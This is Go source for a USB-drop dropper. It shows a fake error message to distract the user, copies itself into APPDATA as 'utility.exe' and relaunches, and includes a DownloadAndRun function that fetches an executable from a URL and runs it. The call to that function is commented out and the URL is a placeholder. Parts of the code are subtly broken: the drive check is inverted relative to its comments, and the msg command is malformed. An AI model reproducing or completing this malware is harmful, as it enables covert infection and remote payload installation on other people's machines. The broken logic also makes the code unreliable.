package main

import (
	"os"
	"time"
	"os/exec"
	"net/http"
	"path/filepath"
	"io"
	"strings"
	"github.com/cleversoap/go-cp"
	)

//Scerario when a usb is droped and someone opens the file

//Shows error message to disude user into opening again and form investigating
//Copies to folder in disk (if executed from usb), exits and starts from drive
//After wait, download client from url
//Executes client

func main() {
	time.Sleep(30 * time.Second)
	volume := filepath.VolumeName(os.Args[0])
	if volume == "C:" {
    	exec.Command("msg * corrupto").Run()  //Start persuasion, opens file to impersonate image or shows error
    	//Copies to C:/
    	cp.Copy(os.Args[0], os.Getenv("APPDATA") + "\\" + "utility.exe")
    	//starts C:/ copy
		exec.Command("cmd", "/c", "start", os.Getenv("APPDATA")+"\\"+"utility.exe").Start()
    	//Exits
    	}
    time.Sleep(10 * time.Second)
    //DownloadAndRun("direct link") //Downloads full client

}

func getExeName() string {
	filename := strings.Split(os.Args[0], "\\")
	return filename[len(filename)-1]
}

func DownloadAndRun(url string) {
	fileName := "file.exe"
	output, err := os.Create(os.Getenv("APPDATA") + "\\" + fileName)
	if err != nil {return}
	defer output.Close()
	response, err := http.Get(url)
	if err != nil {return}
	defer response.Body.Close()
	_, err = io.Copy(output, response.Body)
	if err != nil {return}
	exec.Command("cmd", "/c", "start", os.Getenv("APPDATA")+"\\"+fileName).Start()
}
